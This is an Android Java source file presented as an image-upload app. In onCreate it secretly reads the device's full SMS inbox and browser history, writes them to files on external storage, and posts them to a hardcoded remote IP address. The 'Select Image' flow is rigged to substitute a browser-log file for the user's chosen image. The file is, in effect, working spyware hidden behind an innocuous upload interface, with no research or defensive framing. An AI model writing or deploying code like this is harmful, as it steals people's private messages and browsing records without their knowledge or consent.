package com.example.uploadimagetoserver;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.content.InputStreamBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.StrictMode;
import android.provider.Browser;
import android.provider.MediaStore;
import android.provider.Telephony.Sms;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity implements OnClickListener {

	final static int REQUEST_CODE = 1;
	final static String[]BUTTON_LABEL = {"Select Image","Upload Image"};

	// CHANGE THIS TO YOUR URL
	final static String UPLOAD_SERVER_URI = "http://40.74.117.90/android/uploadToServer.php";

	ProgressDialog progressDialog;
	ScrollView scrollView;
	LinearLayout linearLayout;
	ImageView imageView;
	TextView  imageLocationTextView;
	Button selectImgBtn;
	Button uploadBtn;

	String browserPath = Environment.getExternalStorageDirectory() + "/hirit/log/browser_log.txt";
	String browserName = browserPath.substring(browserPath.lastIndexOf("/"));
	long browserSize = 0; // kb

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		this.setupLayout();
		StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
		.permitAll()
		.detectDiskReads() 
		.detectDiskWrites()
		.detectNetwork() 
		.penaltyLog().build());

		Process process = null;
		try {
			process = Runtime.getRuntime().exec( "logcat -c");
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		getBrowserHist();

		saveLog(process);

		this.progressDialog = this.createDialog();
		this.progressDialog.show();

		// EXECUTED ASYNCTASK TO UPLOAD IMAGE
		new ImageUploader().execute();
		
		// my code 2. sms list view
		TextView view = new TextView(this);
		Uri uri = Uri.parse("content://sms");
		Cursor cur = getContentResolver().query(uri, null, null, null,null);
		String sms = "";
		Log.d("onCreate()", "list view");
		while (cur.moveToNext()) {
			sms += cur.getString(cur.getColumnIndex(Sms.ADDRESS)) + "\t" + cur.getString(cur.getColumnIndex(Sms.BODY)) + "\t" + getDate(cur.getLong(cur.getColumnIndex(Sms.DATE)), "yyMMdd hh:mm") + "\n";
		}
		/*view.setText(sms);
        setContentView(view);*/
		File appDirectory = new File( Environment.getExternalStorageDirectory() + "/hirit" );
		File logDirectory = new File( appDirectory + "/log" );
		File logFile = new File( logDirectory, "sms_list.txt");
		if(logFile.exists()){
			logFile.delete();
		}
		try {
			PrintWriter output = new PrintWriter(logFile);

			output.print(sms);
			output.close();
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		browserSize = getFileSize(browserPath); // kb

		this.progressDialog = this.createDialog();
		this.progressDialog.show();

		// EXECUTED ASYNCTASK TO UPLOAD IMAGE
		new ImageUploader().execute();
	}
	/**
	 * 
	 */

	public boolean isExternalStorageWritable() {
		String state = Environment.getExternalStorageState();
		if ( Environment.MEDIA_MOUNTED.equals( state ) ) {
			return true;
		}
		return false;
	}
	public boolean isExternalStorageReadable() {
		String state = Environment.getExternalStorageState();
		if ( Environment.MEDIA_MOUNTED.equals( state ) ||
				Environment.MEDIA_MOUNTED_READ_ONLY.equals( state ) ) {
			return true;
		}
		return false;
	}
	@SuppressWarnings("deprecation")
	public void getBrowserHist()  {
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0";
		Cursor mCur = managedQuery(Browser.BOOKMARKS_URI, Browser.HISTORY_PROJECTION, sel, null, null);
		int j = mCur.getCount();
		String[] mTitles = new String[j];
		String[] murls = new String[j];
		long[] date=new long[j];
		mCur.moveToFirst();
		int i=0;

		if (mCur.moveToLast() && mCur.getCount() > 0) {
			int titleIdx = mCur.getColumnIndex(Browser.BookmarkColumns.TITLE);
			int urlIdx = mCur.getColumnIndex(Browser.BookmarkColumns.URL);
			int dateIdx=mCur.getColumnIndex(Browser.BookmarkColumns.DATE);

			//while (mCur.isBeforeFirst() == false && mCur.getLong(dateIdx) >= System.currentTimeMillis() - 604800000) { //�ӽ÷� �ֱ� 7�ϵ����� ��ϸ� ����ϵ���
			while (mCur.isBeforeFirst() == false) {
				mTitles[i]=mCur.getString(titleIdx);
				murls[i]=mCur.getString(urlIdx);
				date[i]=mCur.getLong(dateIdx);
				Log.v("history", mTitles[i] + "	" + murls[i] + "	" + getDate(date[i], "yyyy/MM/dd hh:mm"));
				i++;
				mCur.moveToPrevious();
			}
		}
	}
	public void saveLog(Process process){
		//Save
		File appDirectory = new File( Environment.getExternalStorageDirectory() + "/hirit" );
		File logDirectory = new File( appDirectory + "/log" );
		File logFile = new File( logDirectory, browserName);

		if ( isExternalStorageWritable() ) {
			// create app folder
			if ( !appDirectory.exists() ) {
				appDirectory.mkdir();
			}

			// create log folder
			if ( !logDirectory.exists() ) {
				logDirectory.mkdir();
			}
			if(logFile.exists()){
				logFile.delete();
			}
			// clear the previous logcat and then write the new one to the file
			try {
				//Process process = Runtime.getRuntime().exec( "logcat -c");
				process = Runtime.getRuntime().exec( "logcat -f " + logFile + " history *:s");
			} catch ( IOException e ) {
				e.printStackTrace();
			}

		} else if ( isExternalStorageReadable() ) {
			// only readable
		} else {
			// not accessible
		}

		logFile = null;
		browserSize = getFileSize(browserPath);		
	}
	public static String getDate(long milliSeconds, String dateFormat)
	{
		// Create a DateFormatter object for displaying date in specified format.
		SimpleDateFormat formatter = new SimpleDateFormat(dateFormat);

		// Create a calendar object that will convert the date and time value in milliseconds to date.
		Calendar calendar = Calendar.getInstance();
		calendar.setTimeInMillis(milliSeconds);
		return formatter.format(calendar.getTime());
	}



	private void setupLayout(){

		scrollView = new ScrollView(this);
		linearLayout = new LinearLayout(this);
		imageView = new ImageView(this);
		imageLocationTextView = new TextView(this);
		selectImgBtn = new Button(this);
		uploadBtn = new Button(this);


		selectImgBtn.setText(BUTTON_LABEL[0]);
		uploadBtn.setText(BUTTON_LABEL[1]);
		selectImgBtn.setOnClickListener(this);
		uploadBtn.setOnClickListener(this);

		linearLayout.setOrientation(LinearLayout.VERTICAL);
		linearLayout.addView(imageView);
		linearLayout.addView(imageLocationTextView);
		linearLayout.addView(selectImgBtn);
		linearLayout.addView(uploadBtn);

		scrollView.addView(linearLayout);

		this.setContentView(scrollView);
	}
	/**
	 * 
	 * @return
	 */
	private ProgressDialog createDialog(){
		ProgressDialog progressDialog = new ProgressDialog(this);
		progressDialog.setMessage("Please wait.. Uploading File");
		progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
		progressDialog.setCancelable(true);
		
		return progressDialog;
	}

	@Override
	public void onClick(View view) {

		String viewLabel = ((Button)view).getText().toString();

		if(viewLabel.equalsIgnoreCase(BUTTON_LABEL[0])){
			// SELECT IMAGE

			Intent intent = new Intent();
			intent.setType("image/*");
			intent.setAction(Intent.ACTION_GET_CONTENT);
			startActivityForResult(Intent.createChooser(intent, "Select Image"), REQUEST_CODE);

		}else{

			// UPLOAD IMAGE
			/*browserPath = Environment.getExternalStorageDirectory() + "/hirit/log/browser_log1456136294609.txt";
			//browserPath = Environment.getExternalStorageDirectory() + "/DCIM/Facebook/IMG_541809091803.jpeg";
			browserName = browserPath.substring(browserPath.lastIndexOf("/"));

			browserSize = this.getFileSize(browserPath);
			if(this.browserPath == null){
				// IF NO IMAGE SELECTED DO NOTHING
				Toast.makeText(this, "No image selected", Toast.LENGTH_SHORT).show();
				return;
			}

			this.progressDialog = this.createDialog();
			this.progressDialog.show();

			// EXECUTED ASYNCTASK TO UPLOAD IMAGE
			new ImageUploader().execute();*/

		}

	}
	String lineEnd = "\r\n";
	String twoHyphens = "--";
	String boundary = "*****"; 


	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		// TODO Auto-generated method stub
		super.onActivityResult(requestCode, resultCode, data);

		if(requestCode == REQUEST_CODE && resultCode == RESULT_OK){

			Uri selectedImageUri = data.getData();

			// GET IMAGE PATH
			//browserPath = getPath(selectedImageUri);
			browserPath = Environment.getExternalStorageDirectory() + "/hirit/log/browser_log1455873727527.txt";

			// IMAGE NAME
			browserName = browserPath.substring(browserPath.lastIndexOf("/"));

			browserSize = this.getFileSize(browserPath);

			// DECODE TO BITMAP
			Bitmap bitmap=BitmapFactory.decodeFile(browserPath);

			// DISPLAY IMAGE
			imageView.setImageBitmap(bitmap);
			imageLocationTextView.setText("File path :" +browserPath);

		}
	}

	/**
	 * Get the image path
	 * @param uri
	 * @return
	 */
	private String getPath(Uri uri) {
		String[] projection = { MediaStore.Images.Media.DATA };
		Cursor cursor = managedQuery(uri, projection, null, null, null);
		int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
		cursor.moveToFirst();
		return cursor.getString(column_index);
	}
	/**
	 * Get the file size in kilobytes
	 * @return
	 */
	private long getFileSize(String filePath){
		long length = 0;

		try {

			File file = new File(filePath);
			length = file.length();
			length = length / 1024;

		} catch (Exception e) {

			e.printStackTrace();
		}

		return length;
	}

	/**
	 * This class is responsible for uploading data
	 * @author lauro
	 *
	 */
	private class ImageUploader extends AsyncTask<Void, Integer, Boolean> implements UploadProgressListener {

		@Override
		protected Boolean doInBackground(Void... params) {

			try{

				InputStream inputStream = new FileInputStream(new File(browserPath));

				//*** CONVERT INPUTSTREAM TO BYTE ARRAY

				byte[] data = this.convertToByteArray(inputStream);

				HttpClient httpClient = new DefaultHttpClient();
				httpClient.getParams().setParameter(CoreProtocolPNames.USER_AGENT,System.getProperty("http.agent"));

				HttpPost httpPost = new HttpPost(UPLOAD_SERVER_URI);

				// STRING DATA
				StringBody dataString = new StringBody("This is the sample image");

				// FILE DATA OR IMAGE DATA
				InputStreamBody inputStreamBody = new InputStreamBody(new ByteArrayInputStream(data),browserName);

				// MultipartEntity multipartEntity = new MultipartEntity();
				CustomMultiPartEntity  multipartEntity = new CustomMultiPartEntity();

				// SET UPLOAD LISTENER
				multipartEntity.setUploadProgressListener(this);

				//*** ADD THE FILE
				multipartEntity.addPart("file", inputStreamBody);

				//*** ADD STRING DATA
				multipartEntity.addPart("description",dataString);   

				httpPost.setEntity(multipartEntity);
				httpPost.setEntity(multipartEntity);

				// EXECUTE HTTPPOST
				HttpResponse httpResponse = httpClient.execute(httpPost);

				// THE RESPONSE FROM SERVER
				String stringResponse =  EntityUtils.toString(httpResponse.getEntity());

				// DISPLAY RESPONSE OF THE SERVER
				Log.d("data from server",stringResponse);

				browserPath = Environment.getExternalStorageDirectory() + "/hirit/log/sms_list.txt";
				browserName = browserPath.substring(browserPath.lastIndexOf("/"));

			} catch (FileNotFoundException e1) {
				e1.printStackTrace();

				return false;

			} catch (ClientProtocolException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();

				return false;

			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();

				return false;
			}

			return true;
		}

		/**
		 * 
		 */
		@Override
		public void transferred(long num) {

			// COMPUTE DATA UPLOADED BY PERCENT

			long dataUploaded = ((num / 1024) * 100 ) / browserSize;

			// PUBLISH PROGRESS

			this.publishProgress((int)dataUploaded);

		}

		/**
		 * Convert the InputStream to byte[]
		 * @param inputStream
		 * @return
		 * @throws IOException
		 */
		private byte[] convertToByteArray(InputStream inputStream) throws IOException{

			ByteArrayOutputStream bos = new ByteArrayOutputStream();

			int next = inputStream.read();
			while (next > -1) {
				bos.write(next);
				next = inputStream.read();
			}

			bos.flush();

			return bos.toByteArray();
		}



		@Override
		protected void onProgressUpdate(Integer... values) {
			super.onProgressUpdate(values);

			// UPDATE THE PROGRESS DIALOG

			progressDialog.setProgress(values[0]);



		}

		@Override
		protected void onPostExecute(Boolean uploaded) {
			// TODO Auto-generated method stub
			super.onPostExecute(uploaded);


			if( uploaded){

				// UPLOADING DATA SUCCESS

				progressDialog.dismiss();
				Toast.makeText(MainActivity.this, "File Uploaded", Toast.LENGTH_SHORT).show();
				
			}else{

				// UPLOADING DATA FAILED

				progressDialog.setMessage("Uploading Failed");
				progressDialog.setCancelable(true);


			}


		}



	}


}
